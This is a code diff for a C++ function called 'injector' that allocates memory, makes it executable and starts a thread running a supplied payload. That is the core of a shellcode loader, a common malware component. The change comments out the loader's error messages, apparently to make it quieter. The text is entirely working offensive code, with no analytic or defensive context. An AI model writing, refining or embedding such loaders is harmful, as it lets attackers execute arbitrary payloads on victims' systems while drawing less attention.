@@ -15,7 +15,7 @@ int injector(std::vector<uint8_t> payload) {
 
     exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (exec_mem == nullptr) {
-        std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
+        //std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
         return 1;
     }
 
@@ -23,13 +23,13 @@ int injector(std::vector<uint8_t> payload) {
 
     rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
     if (rv == 0) {
-        std::cerr << "VirtualProtect failed: " << GetLastError() << std::endl;
+        //std::cerr << "VirtualProtect failed: " << GetLastError() << std::endl;
         return 1;
     }
 
     th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
     if (th == nullptr) {
-        std::cerr << "CreateThread failed: " << GetLastError() << std::endl;
+        //std::cerr << "CreateThread failed: " << GetLastError() << std::endl;
         return 1;
     }
 
